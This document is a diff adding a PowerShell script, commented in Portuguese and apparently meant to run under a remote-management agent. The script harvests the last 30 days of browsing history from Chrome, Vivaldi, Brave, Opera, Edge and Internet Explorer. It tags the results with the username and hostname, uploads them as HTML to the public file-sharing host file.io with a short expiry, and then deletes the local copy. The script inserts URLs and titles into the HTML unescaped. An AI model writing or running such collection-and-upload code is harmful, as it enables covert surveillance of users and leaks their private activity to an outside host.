@@ -1,0 +1,191 @@
+# Diretórios dos históricos dos navegadores
+$browserPaths = @{
+    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"
+    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
+    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\History"
+    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+}
+
+# Função para coletar histórico via SQLite
+function Get-BrowserHistory {
+    param (
+        [string]$historyPath,
+        [string]$browserName
+    )
+
+    $tempDbPath = "$env:TEMP\temp_history_$browserName"
+    Copy-Item -Path $historyPath -Destination $tempDbPath -Force
+
+    $thirtyDaysAgo = (Get-Date).AddDays(-30).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss")
+    $query = "SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') as visit_time FROM urls WHERE visit_time > '$thirtyDaysAgo' ORDER BY last_visit_time DESC"
+    $browserHistoryData = & sqlite3 $tempDbPath $query | Out-String
+
+    Remove-Item -Path $tempDbPath -Force
+    return $browserHistoryData
+}
+
+# Função para obter histórico do Internet Explorer
+function Get-IEHistory {
+    [cmdletbinding()]
+    param()
+
+    $ieHistory = New-Object System.Collections.Generic.List[PSCustomObject]
+    try {
+        $shell = New-Object -ComObject Shell.Application
+        $folder = $shell.Namespace([System.Environment]::GetFolderPath('History'))
+        $items = $folder.Items()
+
+        foreach ($item in $items) {
+            if ($item.IsFolder) {
+                $subFolderItems = $folder.ParseName($item.Name).GetFolder.Items()
+                foreach ($subItem in $subFolderItems) {
+                    $historyEntry = [PSCustomObject]@{
+                        Browser    = "Internet Explorer"
+                        URL        = $subItem.Path
+                        Title      = $subItem.GetDetailsOf($subItem, 0)
+                        VisitTime  = $subItem.GetDetailsOf($subItem, 2)
+                    }
+                    $ieHistory.Add($historyEntry)
+                }
+            }
+        }
+    }
+    catch {
+        Write-Output "Erro ao obter histórico do Internet Explorer: $_"
+    }
+    return $ieHistory
+}
+
+# Coleta históricos de navegadores instalados
+$installedBrowsers = @()
+$histories = @()
+
+foreach ($browser in $browserPaths.GetEnumerator()) {
+    if (Test-Path $browser.Value) {
+        $installedBrowsers += $browser
+    }
+}
+
+foreach ($browser in $installedBrowsers) {
+    $browserData = Get-BrowserHistory -historyPath $browser.Value -browserName $browser.Key
+    $histories += [PSCustomObject]@{ Browser = $browser.Key; Data = $browserData }
+}
+
+# Inclui histórico do Internet Explorer
+$ieHistory = Get-IEHistory
+$histories += $ieHistory
+
+# Informações do usuário e do dispositivo
+$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$hostName = $env:COMPUTERNAME
+
+# Função para gerar saída HTML
+function Create-HtmlOutput {
+    param (
+        [PSCustomObject[]]$Histories,
+        [string]$UserName,
+        [string]$HostName
+    )
+
+    $htmlContent = @"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Browsing History</title>
+    <style>
+        body { font-size: 10px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #ddd; padding: 8px; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>Browsing History - User: $UserName - Host: $HostName</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Browser</th>
+                <th>Visit Time</th>
+                <th>URL</th>
+                <th>Title</th>
+            </tr>
+        </thead>
+        <tbody>
+"@
+
+    foreach ($history in $Histories) {
+        $rows = $history.Data -split "`r`n"
+        foreach ($row in $rows) {
+            if ($row -ne "") {
+                $columns = $row -split "\|"
+                $visit_time = $columns[2]
+                $title = $columns[1]
+                $url = $columns[0]
+                $htmlContent += "<tr><td>$($history.Browser)</td><td>$visit_time</td><td><a href='$url'>$url</a></td><td>$title</td></tr>`n"
+            }
+        }
+    }
+
+    $htmlContent += @"
+        </tbody>
+    </table>
+</body>
+</html>
+"@
+
+    return $htmlContent
+}
+
+# Diretório temporário para o arquivo HTML
+$tempDirectory = "$env:TEMP\TacticalAgent"
+
+if (-Not (Test-Path -Path $tempDirectory)) {
+    New-Item -Path $tempDirectory -ItemType Directory | Out-Null
+}
+
+# Caminho do arquivo HTML
+$outputFilePath = Join-Path -Path $tempDirectory -ChildPath "browsing_history.html"
+
+# Criar e salvar conteúdo HTML
+$htmlOutput = Create-HtmlOutput -Histories $histories -UserName $userName -HostName $hostName
+[System.IO.File]::WriteAllText($outputFilePath, $htmlOutput, [System.Text.Encoding]::UTF8)
+
+# Chave de API
+$apiKey = "sua_api_key"
+
+# Cabeçalhos e corpo para a requisição HTTP
+$boundary = [System.Guid]::NewGuid().ToString()
+$headers = @{
+    "Authorization" = "Bearer $apiKey"
+    "Content-Type"  = "multipart/form-data; boundary=$boundary"
+}
+
+# Define corpo da requisição com expiração de 15 minutos
+$bodyLines = @(
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $outputFilePath -Leaf)`"",
+    "Content-Type: text/html",
+    "",
+    [System.IO.File]::ReadAllText($outputFilePath),
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"expires`"",
+    "",
+    "15m",  # Definindo expiração para 15 minutos
+    "--$boundary--"
+)
+
+$body = [String]::Join("`r`n", $bodyLines)
+
+# Chamando API para upload
+$response = Invoke-RestMethod -Uri "https://file.io" -Method Post -Headers $headers -Body $body
+
+# Validação e limpeza
+if ($response -ne $null -and $response.success -eq $true) {
+    Write-Output "HTML file uploaded successfully, file details: $($response | ConvertTo-Json)"
+    Remove-Item -Path $outputFilePath -Force
+    Write-Output "Local HTML file deleted."
+} else {
+    Write-Output "Failed to upload the HTML file."
+}
